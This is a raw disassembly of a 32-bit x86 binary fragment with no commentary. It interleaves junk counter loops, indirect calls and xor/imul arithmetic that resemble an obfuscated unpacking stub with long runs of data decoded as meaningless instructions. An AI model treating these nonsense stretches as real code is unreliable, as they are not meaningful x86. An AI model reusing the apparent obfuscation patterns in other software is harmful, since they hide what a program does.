  4083fe:	sub    esp,DWORD PTR [ecx+0x32d313a]
  408404:	(bad)  
  408405:	das    
  408406:	shr    BYTE PTR [edi-0x32],cl
  408409:	pusha  
  40840a:	(bad)  ds:[ebp+ebx*2-0x3a]
  40840f:	icebp  
  408410:	test   al,0x30
  408412:	or     eax,0x7148b4df
  408417:	or     esi,DWORD PTR [edx+0xbea5fdd]
  40841d:	sub    esp,ecx
  40841f:	jnp    0x4083fb
  408421:	lock cs (bad) 
  408424:	stos   BYTE PTR es:[edi],al
  408425:	push   edx
  408426:	xor    al,0xbb
  408428:	add    ebx,edi
  40842a:	adc    BYTE PTR [edi+ebx*2+0x1f7b90ff],bh
  408431:	addr16 das 
  408433:	popf   
  408434:	pop    ds
  408435:	cmp    esp,ecx
  408437:	(bad)  
  408439:	pushf  
  40843a:	loopne 0x408465
  40843c:	and    edx,ebp
  40843e:	lds    edi,FWORD PTR [eax]
  408440:	imul   bl
  408442:	sub    DWORD PTR [esi-0x22e060fd],ebp
  408448:	daa    
  408449:	sbb    DWORD PTR [esp+ebx*4+0x726bea9a],0x9
  408451:	xlat   BYTE PTR ds:[ebx]
  408452:	push   ss
  408453:	imul   esp,DWORD PTR [ebp-0x11],0x28
  408457:	xchg   edx,eax
  408458:	jne    0x408494
  40845a:	mov    ecx,0xff405fc9
  40845f:	fidivr DWORD PTR [ebp-0x56]
  408462:	jmp    0xb219:0xd33ee126
  408469:	retf   
  40846a:	or     DWORD PTR [edi-0x37],ebx
  40846d:	loopne 0x4084e7
  40846f:	lock cs js 0x4084dd
  408473:	xchg   edi,eax
  408474:	sbb    BYTE PTR [ecx+ebx*8-0x4586bf09],bl
  40847b:	imul   ecx,DWORD PTR [ecx],0x91ec5a47
  408481:	bound  edi,QWORD PTR [ebp+0x1869820f]
  408487:	add    BYTE PTR [eax],al
  408489:	mov    edx,DWORD PTR [ebp-0x28]
  40848c:	sbb    edi,0x56c5
  408492:	mov    edi,DWORD PTR [ebp-0x4]
  408495:	xor    ebx,DWORD PTR ds:0x432dd6
  40849b:	xor    edx,eax
  40849d:	and    DWORD PTR ds:0x434411,0x0
  4084a7:	jmp    0x4084bb
  4084ac:	xor    ebx,ebx
  4084ae:	xor    ebx,DWORD PTR ds:0x434411
  4084b4:	inc    ebx
  4084b5:	mov    DWORD PTR ds:0x434411,ebx
  4084bb:	cmp    DWORD PTR ds:0x434411,0x18
  4084c2:	jae    0x4084e3
  4084c8:	cmp    DWORD PTR ds:0x434411,0x22
  4084cf:	jne    0x4084de
  4084d5:	push   DWORD PTR [ebp-0x1c]
  4084d8:	call   DWORD PTR ds:0x432c42
  4084de:	jmp    0x4084ac
  4084e3:	xor    edi,eax
  4084e5:	add    edi,ecx
  4084e7:	mov    ebx,DWORD PTR ds:0x43441d
  4084ed:	add    DWORD PTR ds:0x432dca,ebx
  4084f3:	add    edx,ecx
  4084f5:	add    DWORD PTR ds:0x434366,ecx
  4084fb:	imul   edx,edi
  4084fe:	mov    edi,DWORD PTR [ebp-0x8]
  408501:	mov    ebx,DWORD PTR ds:0x43442d
  408507:	or     DWORD PTR ds:0x434419,ebx
  40850d:	mov    ebx,DWORD PTR [ebp-0x10]
  408510:	sub    ebx,edi
  408512:	cmp    ebx,edx
  408514:	mov    DWORD PTR ds:0x434425,0x4da5
  40851e:	ja     0x40879c
  408524:	and    DWORD PTR ds:0x4326fc,0x0
  40852e:	jmp    0x408540
  408533:	mov    edx,DWORD PTR ds:0x4326fc
  408539:	inc    edx
  40853a:	mov    DWORD PTR ds:0x4326fc,edx
  408540:	cmp    DWORD PTR ds:0x4326fc,0x1b
  408547:	jae    0x408786
  40854d:	cmp    DWORD PTR ds:0x4326fc,0x1d
  408554:	jne    0x408563
  40855a:	push   DWORD PTR [ebp-0x28]
  40855d:	call   DWORD PTR ds:0x4329d2
  408563:	jmp    0x408533
  408568:	adc    DWORD PTR ds:0x432dc6,0x7927
  408572:	jmp    0x408786
  408577:	rcr    DWORD PTR [ebp-0xc8d3cb2],0x51
  40857e:	popf   
  40857f:	push   es
  408580:	stos   DWORD PTR es:[edi],eax
  408581:	arpl   bp,sp
  408583:	mov    ebp,0xa8dd22d2
  408588:	aam    0x70
  40858a:	jo     0x4085f5
  40858c:	jg     0x4085fe
  40858e:	jo     0x4085d7
  408590:	clc    
  408591:	loop   0x40855a
  408593:	jl     0x4085b6
  408595:	fist   DWORD PTR [edi-0x4c680668]
  40859b:	add    BYTE PTR [edi-0x69],0x76
  40859f:	cld    
  4085a0:	js     0x40856c
  4085a2:	sahf   
  4085a3:	jl     0x408587
  4085a5:	xchg   ebx,eax
  4085a6:	sbb    ch,BYTE PTR [edi-0x64]
  4085a9:	mov    ds:0x208563b5,al
  4085ae:	ins    DWORD PTR es:[edi],dx
  4085af:	add    ah,al
  4085b1:	mov    ch,0x9e
  4085b3:	cdq    
  4085b4:	or     eax,0x7d7ed21a
  4085b9:	sahf   
  4085ba:	stc    
  4085bb:	dec    eax
  4085bc:	jae    0x408612
  4085be:	int3   
  4085bf:	scas   eax,DWORD PTR es:[edi]
  4085c0:	cld    
  4085c1:	fld    TBYTE PTR [ebp+0x554ab15d]
  4085c7:	xchg   ecx,eax
  4085c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085c9:	daa    
  4085ca:	fdiv   DWORD PTR [esi+ebp*4]
  4085cd:	sub    cl,al
  4085cf:	pusha  
  4085d0:	test   eax,0x80c109e3
  4085d5:	xchg   DWORD PTR [ecx],edx
  4085d7:	cmc    
  4085d8:	jecxz  0x408561
  4085da:	hlt    
  4085db:	inc    edi
  4085dc:	sub    BYTE PTR [edx-0x77],ah
  4085df:	xchg   ebp,eax
  4085e0:	push   DWORD PTR [ecx]
  4085e2:	or     ecx,0xeedb9e71
  4085e8:	mov    ch,0xc5
  4085ea:	gs xchg ecx,eax
  4085ec:	cmp    ah,ah
  4085ee:	pop    esp
  4085ef:	push   edi
  4085f0:	jecxz  0x40861e
  4085f2:	jns    0x408619
  4085f4:	stos   DWORD PTR es:[edi],eax
  4085f5:	pop    ds
  4085f6:	cmp    al,0x87
  4085f8:	fnsave [edx+0x614a7db]
  4085fe:	jmp    0x408647
  408600:	sub    al,0x9c
  408602:	mov    edx,0xc97839d5
  408607:	xadd   BYTE PTR [ebx],bh
  40860a:	idiv   DWORD PTR [ebp-0x50]
  40860d:	push   0xffffffde
  40860f:	mov    bl,0x42
  408611:	adc    eax,0x8d7a2e17
  408616:	sbb    eax,0xda08e85
  40861b:	(bad)  
  40861c:	lock in eax,dx
  40861e:	std    
  40861f:	sbb    eax,0xea2bc762
  408624:	into   
  408625:	jg     0x40861b
  408627:	inc    eax
  408628:	adc    BYTE PTR [edi+0x5e],ah
  40862b:	xchg   ecx,eax
  40862c:	popa   
  40862d:	in     eax,0x82
  40862f:	fiadd  WORD PTR [edx-0x72]
  408632:	adc    cl,BYTE PTR [esp+ebx*8+0x6]
  408636:	pop    ecx
  408637:	dec    edx
  408638:	cmp    esp,ecx
  40863a:	pop    eax
  40863b:	shr    BYTE PTR [edi],cl
  40863d:	push   ebp
  40863e:	mov    cr5,edx
  408641:	cmp    ecx,edi
  408643:	xor    ah,cl
  408645:	retf   0x3fb0
  408648:	jo     0x40865f
  40864a:	xor    dh,bh
  40864c:	sbb    eax,0x67844ae3
  408651:	xor    esp,eax
  408653:	sub    eax,0xe45d44d7
  408658:	push   ebp
  408659:	aaa    
  40865a:	or     al,0x38
  40865c:	mov    esi,edx
  40865e:	aad    0x7
  408660:	nop
  408661:	add    ch,BYTE PTR [edi-0x7f]
  408664:	cli    
  408665:	xadd   BYTE PTR [esi],dh
  408668:	lahf   
  408669:	mov    BYTE PTR [bx],dh
  40866c:	adc    al,0xfc
  40866e:	shl    DWORD PTR [ebp+0x77],0xb8
  408672:	imul   ebx,DWORD PTR [esi+0x4a],0x65
  408676:	mov    WORD PTR [eax-0x525bd450],ss
  40867c:	dec    ecx
  40867d:	adc    al,0x64
  40867f:	dec    ecx
  408680:	add    al,0x6d
  408682:	int3   
  408683:	mov    ecx,0x608ff9a3
  408688:	pop    esp
  408689:	in     al,0x75
  40868b:	jne    0x4086fa
  40868d:	ins    BYTE PTR es:[edi],dx
  40868e:	jnp    0x4086c1
  408690:	lods   al,BYTE PTR ds:[esi]
  408691:	imul   esp
  408693:	mov    dl,0x15
  408695:	das    
  408696:	sub    eax,0xa52a0ef2
  40869b:	ret    
  40869c:	dec    ecx
  40869d:	loopne 0x4086cc
  40869f:	cmp    ebx,ecx
  4086a1:	mov    edi,ebp
  4086a3:	sbb    al,0x56
  4086a5:	inc    edi
  4086a6:	add    bl,BYTE PTR [esi-0x45d2b751]
  4086ac:	lods   al,BYTE PTR ds:[esi]
  4086ad:	test   al,0xed
  4086af:	mov    ah,0x22
  4086b1:	loop   0x4086ce
  4086b3:	setae  BYTE PTR [esi]
  4086b6:	dec    edi
  4086b7:	mov    ch,0xd2
  4086b9:	xchg   esp,ecx
  4086bb:	pushf  
  4086bc:	call   0xeb16ec79
  4086c1:	pop    es
  4086c2:	loop   0x408704
  4086c4:	cmp    DWORD PTR [edx+0x9],0xb95292fa
  4086cb:	xchg   DWORD PTR [ebx+0x20],edx
  4086ce:	(bad)  
  4086cf:	into   
  4086d0:	mov    ds:0x6ebc922d,eax
  4086d5:	in     eax,dx
  4086d6:	cmp    ecx,DWORD PTR [ecx-0x4b702aa]
  4086dc:	jmp    0xc1f1:0x80338055
  4086e3:	xlat   BYTE PTR ds:[ebx]
  4086e4:	cmp    DWORD PTR gs:[esi-0x21b13046],edi
  4086eb:	les    esi,FWORD PTR [ebx-0x5c96fc7c]
  4086f1:	sbb    eax,0x2b0ccce3
  4086f6:	scas   eax,DWORD PTR es:[edi]
  4086f7:	test   BYTE PTR [edi],cl
  4086f9:	jo     0x408707
  4086fb:	(bad)  
  4086fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086fd:	test   BYTE PTR [edx+0x4d],0x6a
  408701:	mov    eax,ds:0x7a7ee50d
  408706:	cs cmp eax,0x2873b88b
  40870c:	mov    eax,ds:0x719c8eca
  408711:	jns    0x40876a
  408713:	fadd   QWORD PTR [eax+0x7b385209]
  408719:	dec    ebx
  40871a:	xor    ecx,DWORD PTR [ebp+0x22]
  40871d:	mov    edi,0x1c1124bd
  408722:	in     eax,0xf7
  408724:	jge    0x4086f0
  408726:	out    0xbb,eax
  408728:	pop    edi
  408729:	je     0x40878f
  40872b:	enter  0x5b1,0xf3
  40872f:	mov    dl,0xa8
  408731:	arpl   WORD PTR [edx+0x521f7245],cx
  408737:	lods   al,BYTE PTR ds:[esi]
  408738:	cmp    eax,0x6c8e0cb4
  40873d:	dec    edi
  40873e:	jecxz  0x408731
  408740:	jnp    0x408719
  408742:	cmp    al,0x1f
  408744:	xor    eax,0x3aa87b3f
  408749:	push   ds
  40874a:	cwde   
  40874b:	retf   0x1203
  40874e:	in     al,0xe3
  408750:	push   edi
  408751:	loopne 0x408792
  408753:	mov    dh,0x72
  408755:	inc    edx
  408756:	mov    edi,0x37f28221
  40875b:	lods   al,BYTE PTR ds:[esi]
  40875c:	les    eax,FWORD PTR [edx]
  40875e:	and    ebp,DWORD PTR [edi-0x3c490a38]
  408764:	pop    ds
  408765:	repz xchg esi,eax
  408767:	pop    ebp
  408768:	cld    
  408769:	xor    DWORD PTR [ebx+0x5a],esi
  40876c:	retf   
  40876d:	fbstp  TBYTE PTR [edi]
  40876f:	stos   DWORD PTR es:[edi],eax
  408770:	(bad)  
  408771:	mov    ds:0x57119272,al
  408776:	mov    bl,BYTE PTR [ebx]
  408778:	js     0x408748
  40877a:	dec    ebp
  40877b:	cdq    
  40877c:	xor    al,0x42
  40877e:	test   DWORD PTR [ecx+0x4975a77b],0x558b0df5
  408788:	cld    
  408789:	xor    edx,eax
  40878b:	add    edx,ecx
  40878d:	mov    DWORD PTR ds:0x43438a,0x22ee
  408797:	jmp    0x408b38
  40879c:	and    edx,edi
  40879e:	mov    edx,DWORD PTR [ebp-0x2c]
  4087a1:	or     edi,edi
  4087a3:	mov    edi,DWORD PTR [ebp-0x4]
  4087a6:	xor    edx,eax
  4087a8:	not    ebx
  4087aa:	xor    edi,eax
  4087ac:	sub    DWORD PTR ds:0x43438a,0x43441d
  4087b6:	add    edi,ecx
  4087b8:	or     ebx,DWORD PTR ds:0x434415
  4087be:	add    edx,ecx
  4087c0:	or     DWORD PTR ds:0x43438e,edi
  4087c6:	imul   edx,edi
  4087c9:	adc    DWORD PTR ds:0x434415,ebx
  4087cf:	mov    edi,DWORD PTR [ebp-0x8]
  4087d2:	sub    ebx,0x42e0
  4087d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4087db:	and    DWORD PTR ds:0x434372,0x1110
  4087e5:	sub    ebx,edi
  4087e7:	cmp    ebx,edx
  4087e9:	mov    DWORD PTR ds:0x432708,0x5f46
  4087f3:	ja     0x40880b
  4087f9:	mov    edx,DWORD PTR [ebp-0x28]
  4087fc:	mov    DWORD PTR ds:0x434425,0x1e0
  408806:	jmp    0x408b2a
  40880b:	mov    edx,DWORD PTR [ebp-0x30]
  40880e:	mov    edi,DWORD PTR [ebp-0x4]
  408811:	xor    DWORD PTR ds:0x432dd2,ecx
  408817:	xor    edx,eax
  408819:	mov    DWORD PTR ds:0x43436a,0x13
  408823:	cmp    DWORD PTR ds:0x43436a,0x0
  40882a:	je     0x40887c
  408830:	cmp    DWORD PTR ds:0x43436a,0x4
  408837:	jne    0x40884e
  40883d:	push   0x43287d
  408842:	push   DWORD PTR [ebp-0x20]
  408845:	push   DWORD PTR [ebp-0xc]
  408848:	call   DWORD PTR ds:0x432cfa
  40884e:	cmp    DWORD PTR ds:0x43436a,0x5
  408855:	jne    0x40886a
  40885b:	xor    ebx,ebx
  40885d:	add    ebx,DWORD PTR ds:0x43436a
  408863:	dec    ebx
  408864:	mov    DWORD PTR ds:0x43436a,ebx
  40886a:	mov    ebx,DWORD PTR ds:0x43436a
  408870:	dec    ebx
  408871:	mov    DWORD PTR ds:0x43436a,ebx
  408877:	jmp    0x408823
  40887c:	xor    edi,eax
  40887e:	add    edi,ecx
  408880:	add    edx,ecx
  408882:	imul   edx,edi
  408885:	mov    edi,DWORD PTR [ebp-0x8]
  408888:	mov    ebx,DWORD PTR [ebp-0x10]
  40888b:	sub    ebx,edi
  40888d:	cmp    ebx,edx
  40888f:	ja     0x40889d
  408895:	mov    edx,DWORD PTR [ebp-0x2c]
  408898:	jmp    0x408b2a
  40889d:	mov    edx,DWORD PTR [ebp-0x34]
  4088a0:	mov    edi,DWORD PTR [ebp-0x4]
  4088a3:	xor    edx,eax
  4088a5:	xor    edi,eax
  4088a7:	add    edi,ecx
  4088a9:	add    edx,ecx
  4088ab:	imul   edx,edi
  4088ae:	mov    edi,DWORD PTR [ebp-0x8]
  4088b1:	mov    ebx,DWORD PTR [ebp-0x10]
  4088b4:	sub    ebx,edi
  4088b6:	cmp    ebx,edx
  4088b8:	ja     0x4088c6
  4088be:	mov    edx,DWORD PTR [ebp-0x30]
  4088c1:	jmp    0x408b2a
  4088c6:	mov    edx,DWORD PTR [ebp-0x38]
  4088c9:	mov    edi,DWORD PTR [ebp-0x4]
  4088cc:	xor    edx,eax
  4088ce:	xor    edi,eax
  4088d0:	add    edi,ecx
  4088d2:	add    edx,ecx
  4088d4:	imul   edx,edi
  4088d7:	mov    edi,DWORD PTR [ebp-0x8]
  4088da:	mov    ebx,DWORD PTR [ebp-0x10]
  4088dd:	sub    ebx,edi
  4088df:	cmp    ebx,edx
  4088e1:	ja     0x4088ef
  4088e7:	mov    edx,DWORD PTR [ebp-0x34]
  4088ea:	jmp    0x408b2a
  4088ef:	mov    edx,DWORD PTR [ebp-0x3c]
  4088f2:	mov    edi,DWORD PTR [ebp-0x4]
  4088f5:	xor    edx,eax
  4088f7:	xor    edi,eax
  4088f9:	add    edx,ecx
  4088fb:	add    edi,ecx
  4088fd:	imul   edx,edi
  408900:	mov    edi,DWORD PTR [ebp-0x8]
  408903:	mov    ebx,DWORD PTR [ebp-0x10]
  408906:	sub    ebx,edi
  408908:	cmp    ebx,edx
  40890a:	mov    edx,DWORD PTR [ebp-0x38]
  40890d:	jbe    0x408b2a
  408913:	mov    edx,DWORD PTR [ebp-0x3c]
  408916:	jmp    0x408b2a
  40891b:	imul   ebx,DWORD PTR [edx-0x5eb67e05],0x71
  408922:	jb     0x40895b
  408924:	adc    esi,DWORD PTR [ebx-0xb8b5ab5]
  40892a:	fsub   DWORD PTR [ecx+0x697070d2]
  408930:	jg     0x4089a2
  408932:	jo     0x4088fe
  408934:	or     BYTE PTR [ecx-0x37],bh
  408937:	adc    BYTE PTR [eax+ecx*4+0x38c9e5a8],0xad
  40893f:	inc    edx
  408940:	cmp    ch,BYTE PTR [esi]
  408942:	sub    DWORD PTR [ecx-0x4f],edx
  408945:	aad    0x70
  408947:	jns    0x40893a
  408949:	and    DWORD PTR [edi],edx
  40894b:	fiadd  WORD PTR [eax+0x3754cb2c]
  408951:	icebp  
  408952:	jmp    0x4c47378
  408957:	jg     0x408952
  408959:	add    al,0xaa
  40895b:	cld    
  40895c:	bnd jns 0x408991
  40895f:	dec    esp
  408960:	int    0x98
  408962:	cwde   
  408963:	jp     0x408956
  408965:	xor    al,BYTE PTR [esi+0x20]
  408968:	ret    0xd1d7
  40896b:	xor    eax,0xa49e7cf2
  408970:	ret    0x6216
  408973:	push   ecx
  408974:	mov    WORD PTR [ecx-0x60],cs
  408977:	and    BYTE PTR [ebp+0x22317ef6],0xe3
  40897e:	sbb    esi,DWORD PTR [edx]
  408980:	dec    ebx
  408981:	fs ins DWORD PTR es:[edi],dx
  408983:	jbe    0x4089f8
  408985:	or     BYTE PTR [ebx+0x75],al
  408988:	push   DWORD PTR [edx+0x53ed8c0f]
  40898e:	pusha  
  40898f:	lahf   
  408990:	out    dx,al
  408991:	syscall 
  408993:	aaa    
  408994:	int    0x3
  408996:	lea    ebp,[ebp+0x75300526]
  40899c:	out    dx,al
  40899d:	adc    BYTE PTR [esi],ah
  40899f:	popf   
  4089a0:	and    eax,0xce7374ef
  4089a5:	dec    ecx
  4089a6:	jbe    0x4089a7
  4089a8:	add    ah,BYTE PTR [esi+0x1dda9603]
  4089ae:	and    edi,ecx
  4089b0:	sbb    eax,0xb5716d52
  4089b5:	out    0x13,eax
  4089b7:	dec    edi
  4089b8:	inc    edx
  4089b9:	sbb    eax,0xe2351df9
  4089be:	ret    0xafce
  4089c1:	sahf   
  4089c2:	cmp    edi,edi
  4089c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089c5:	jg     0x408a34
  4089c7:	(bad)  
  4089c8:	jl     0x40898c
  4089ca:	mov    ds:0x78ba7f46,al
  4089cf:	mov    cl,bl
  4089d1:	mov    bl,0x12
  4089d3:	test   ecx,esp
  4089d5:	clc    
  4089d6:	inc    esi
  4089d7:	push   0xffffffd2
  4089d9:	outs   dx,DWORD PTR ds:[esi]
  4089da:	pop    eax
  4089db:	adc    BYTE PTR [ecx-0x408fbcfc],dl
  4089e1:	mov    dl,0x4a
  4089e3:	add    esp,ebx
  4089e5:	retf   
  4089e6:	outs   dx,BYTE PTR ds:[esi]
  4089e7:	xchg   DWORD PTR [eax+0x3e],esi
  4089ea:	pop    esi
  4089eb:	mov    ds:0xd041de6b,al
  4089f0:	push   cs
  4089f1:	(bad)  [ebp-0x5dd7f60f]
  4089f7:	loop   0x408a0c
  4089f9:	and    dl,BYTE PTR [ebx-0x5691771e]
  4089ff:	mov    eax,ds:0xaa35c563
  408a04:	rcr    ebx,cl
  408a06:	cld    
  408a07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a08:	popf   
  408a09:	and    dl,bh
  408a0b:	ficom  DWORD PTR [eax]
  408a0d:	pop    ebx
  408a0e:	lahf   
  408a0f:	pop    ecx
  408a10:	dec    esp
  408a11:	rcl    esi,1
  408a13:	mov    al,ds:0x6fb10cba
  408a18:	ja     0x4089c1
  408a1a:	sbb    bl,ch
  408a1c:	fs ret 
  408a1e:	mov    ecx,0xda1bcd1a
  408a23:	or     ch,ah
  408a25:	retf   
  408a26:	cmp    eax,0x6d07963f
  408a2b:	xchg   ebp,eax
  408a2c:	push   eax
  408a2d:	ret    
  408a2e:	and    esp,DWORD PTR [ebx-0x2d5f122f]
  408a34:	fild   WORD PTR [ebx-0x23837c64]
  408a3a:	rcl    DWORD PTR [edi],cl
  408a3c:	sbb    DWORD PTR [edx-0x300b6500],edi
  408a42:	xchg   BYTE PTR [edi],ch
  408a44:	mov    bl,0xae
  408a46:	test   cl,cl
  408a48:	or     bh,BYTE PTR [edi]
  408a4a:	push   0xd7eabe65
  408a4f:	and    dh,BYTE PTR [ebx+0x1161f3d9]
  408a55:	ret    
  408a56:	jae    0x408a5e
  408a58:	add    edi,edi
  408a5a:	xchg   ebp,eax
  408a5b:	jae    0x408a34
  408a5d:	hlt    
  408a5e:	xor    bl,BYTE PTR [ebx-0x7d98de9b]
  408a64:	push   edx
  408a65:	call   0x2379ccf5
  408a6a:	clc    
  408a6b:	jle    0x408a51
  408a6d:	inc    edi
  408a6e:	inc    esi
  408a6f:	cmp    DWORD PTR [esi-0x4fcd97f2],esp
  408a75:	sub    eax,0xc5b3cbbc
  408a7a:	and    DWORD PTR [eax+0x15],eax
  408a7d:	stc    
  408a7e:	inc    edx
  408a7f:	std    
  408a80:	inc    ecx
  408a81:	call   0x4e0e:0x31ba1897
  408a88:	xchg   DWORD PTR [eax+0x3a],eax
  408a8b:	mov    ds:0xb2c13d3d,al
  408a90:	push   0x5c
  408a92:	sahf   
  408a93:	xchg   edx,eax
  408a94:	ret    
  408a95:	outs   dx,BYTE PTR ds:[esi]
  408a96:	(bad)  
  408a97:	aam    0x44
  408a99:	mov    ebx,0x4d1337a3
  408a9e:	stos   DWORD PTR es:[edi],eax
  408a9f:	call   0x7b5e:0x701ef52b
  408aa6:	popf   
  408aa7:	scas   al,BYTE PTR es:[edi]
  408aa8:	les    ecx,FWORD PTR [edx+edx*1]
  408aab:	(bad)  
  408aac:	xchg   ecx,eax
  408aad:	ror    BYTE PTR [ecx+0xdab8930],cl
  408ab3:	xchg   edi,eax
  408ab4:	(bad)  
  408ab6:	sbb    BYTE PTR [ebx+0x288209b2],ch
  408abc:	jge    0x408a6d
  408abe:	jecxz  0x408acd
  408ac0:	xchg   edx,eax
  408ac1:	sbb    cl,ah
  408ac3:	push   0xfffffffb
  408ac5:	aam    0x48
  408ac7:	test   eax,0x24f7f57e
  408acc:	test   BYTE PTR [eax+0x108c0f9b],al
  408ad2:	ins    BYTE PTR es:[edi],dx
  408ad3:	fst    QWORD PTR [ecx-0x64]
  408ad6:	xchg   esi,eax
  408ad7:	pop    ebp
  408ad8:	or     BYTE PTR [ebx-0x69c024e],dh
  408ade:	cdq    
  408adf:	push   ds
  408ae0:	dec    edi
  408ae1:	inc    eax
  408ae2:	ds leave 
  408ae4:	jae    0x408b3c
  408ae6:	addr16 push 0x3060b249
  408aec:	or     DWORD PTR [eax],esi
  408aee:	adc    DWORD PTR [edi],esi
  408af0:	cld    
  408af1:	inc    ebx
  408af2:	jne    0x408ab9
  408af4:	sbb    eax,0x51f1be66
  408af9:	mov    cl,0x6b
  408afb:	adc    al,0x4f
  408afd:	mov    edx,0x66e981c
  408b02:	ss xchg esp,eax
  408b04:	jecxz  0x408af4
  408b06:	push   ebx
  408b07:	jo     0x408afb
  408b09:	pushf  
  408b0a:	cwde   
  408b0b:	mov    dl,0x6c
  408b0d:	ret    
  408b0e:	lods   al,BYTE PTR ds:[esi]
  408b0f:	nop
  408b10:	jbe    0x408ab1
  408b12:	mov    edx,0x51f4652
  408b17:	paddb  mm5,QWORD PTR [edx-0x40]
  408b1b:	in     eax,dx
  408b1c:	aad    0xaf
  408b1e:	clc    
  408b1f:	and    DWORD PTR [edx+0x8],ecx
  408b22:	js     0x408af0
  408b24:	jmp    0x8b2c:0x2702b442
  408b2b:	jge    0x408b29
  408b2d:	xor    edi,eax
  408b2f:	xor    edx,eax
  408b31:	add    edi,ecx
  408b33:	add    edx,ecx
  408b35:	imul   edx,edi
  408b38:	mov    DWORD PTR [ebp+0xc],edx
  408b3b:	mov    edx,DWORD PTR [ebp+0xc]
  408b3e:	mov    DWORD PTR [ebp-0x24],edx
  408b41:	mov    edx,DWORD PTR [ebp-0x8]
  408b44:	add    edx,DWORD PTR [ebp-0x40]
  408b47:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408b4e:	mov    DWORD PTR [ebp-0x1c],edx
  408b51:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  408b58:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  408b5f:	mov    edx,DWORD PTR [ebp-0x18]
  408b62:	xor    edx,eax
  408b64:	add    edx,ecx
  408b66:	jmp    0x409637
  408b6b:	mov    edx,DWORD PTR [ebp-0x18]
  408b6e:	xor    edx,eax
  408b70:	add    edx,DWORD PTR [ebp-0x14]
  408b73:	mov    edi,DWORD PTR [ebp-0x1c]
  408b76:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408b7d:	mov    BYTE PTR [ebp+0xf],dl
  408b80:	jmp    0x408d94
  408b85:	arpl   WORD PTR [ecx+edx*8+0x7359f11a],dx
  408b8c:	push   ecx
  408b8d:	out    0xb0,eax
  408b8f:	jnp    0x408bf2
  408b91:	aad    0x1
  408b93:	stos   BYTE PTR es:[edi],al
  408b94:	push   es
  408b95:	call   0x707f:0x697070d0
  408b9c:	jo     0x408c17
  408b9e:	push   esp
  408b9f:	push   ecx
  408ba0:	pop    ebp
  408ba1:	dec    ecx
  408ba2:	mov    ecx,0x62ebba6
  408ba7:	or     bh,dh
  408ba9:	aas    
  408baa:	adc    eax,0x699e7fa1
  408baf:	out    dx,eax
  408bb0:	clc    
  408bb1:	xor    eax,0x2b770eb8
  408bb6:	xor    DWORD PTR [esi-0x2e1af35d],esp
  408bbc:	xchg   esp,edx
  408bbe:	sbb    DWORD PTR [edx],edx
  408bc0:	clc    
  408bc1:	push   ss
  408bc2:	imul   edx,ebp,0x34856651
  408bc8:	adc    al,0x26
  408bca:	xchg   esp,eax
  408bcb:	sbb    edx,DWORD PTR [esi+ebx*8-0x4cbf0275]
  408bd2:	enter  0x80b6,0x27
  408bd6:	inc    edx
  408bd7:	mov    BYTE PTR [ecx-0x2cc82457],al
  408bdd:	adc    DWORD PTR [edi-0x299c29fd],edx
  408be3:	mov    bh,0x18
  408be5:	mov    eax,DWORD PTR [esi]
  408be7:	add    al,0x6c
  408be9:	outs   dx,BYTE PTR ds:[esi]
  408bea:	jno    0x408b70
  408bec:	cmp    dh,BYTE PTR [eax]
  408bee:	jb     0x408bb5
  408bf0:	fs loopne 0x408c39
  408bf3:	jnp    0x408c46
  408bf5:	ja     0x408bb9
  408bf7:	outs   dx,BYTE PTR ds:[esi]
  408bf8:	test   al,0x4d
  408bfb:	mov    cl,0xcd
  408bfd:	hlt    
  408bfe:	jmp    DWORD PTR [edx+0x56adffea]
  408c04:	or     al,0x9a
  408c06:	lods   al,BYTE PTR ds:[esi]
  408c07:	mov    ch,0x88
  408c09:	aad    0x3d
  408c0b:	cmc    
  408c0c:	sub    eax,0x3b6f958e
  408c11:	out    0x4,eax
  408c13:	repz sub BYTE PTR ds:0xc9694cf2,0x71
  408c1b:	pushf  
  408c1c:	jmp    0x1d15:0x6c8ba916
  408c23:	pop    ds
  408c24:	mov    bh,0x87
  408c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c27:	jg     0x408bd5
  408c29:	aam    0x2b
  408c2b:	adc    ecx,DWORD PTR [ebx+0x2]
  408c2e:	push   0x62a8fd13
  408c33:	aad    0x53
  408c35:	fs push ebp
  408c37:	test   BYTE PTR [edx-0x66],ch
  408c3a:	fs retf 0x15ef
  408c3e:	je     0x408c78
  408c40:	aam    0xb6
  408c42:	mov    ah,0x77
  408c44:	inc    esp
  408c45:	cwde   
  408c46:	test   dl,ch
  408c48:	or     edx,DWORD PTR [ebx]
  408c4a:	test   DWORD PTR [ecx-0xa494962],eax
  408c50:	push   esi
  408c51:	inc    esp
  408c52:	repnz mov edi,0xcad810d9
  408c58:	xor    eax,DWORD PTR [edx-0x2a]
  408c5b:	inc    ebx
  408c5c:	pop    ecx
  408c5d:	jmp    DWORD PTR [eax+0x2c358a65]
  408c63:	fimul  DWORD PTR [edx]
  408c65:	aas    
  408c66:	pop    ss
  408c67:	cmp    al,0x52
  408c69:	fadd   DWORD PTR [esi-0x12d6d324]
  408c6f:	jmp    0x408c39
  408c71:	dec    eax
  408c72:	push   ds
  408c73:	rcr    DWORD PTR [edx+0x6d],1
  408c76:	scas   eax,DWORD PTR es:[edi]
  408c77:	xor    al,0x52
  408c79:	inc    esi
  408c7a:	std    
  408c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c7c:	mov    esi,0xd935d542
  408c81:	mov    bl,BYTE PTR [edi+ebp*4-0x31]
  408c85:	sahf   
  408c86:	xchg   edi,eax
  408c87:	das    
  408c88:	ret    0x1903
  408c8b:	stos   BYTE PTR es:[edi],al
  408c8c:	popf   
  408c8d:	fsubr  DWORD PTR [esi+eiz*8+0x1d]
  408c91:	inc    eax
  408c92:	pusha  
  408c93:	loopne 0x408c2b
  408c95:	and    BYTE PTR [edx+0x27],bh
  408c98:	popa   
  408c99:	jo     0x408cee
  408c9b:	add    eax,DWORD PTR [ecx+0x13]
  408c9e:	pop    es
  408c9f:	lds    edx,FWORD PTR [edi+eax*1]
  408ca2:	call   0xa757d9af
  408ca7:	retf   
  408ca8:	jg     0x408ca5
  408caa:	jge    0x408cf9
  408cac:	lea    ebp,[edi-0xf]
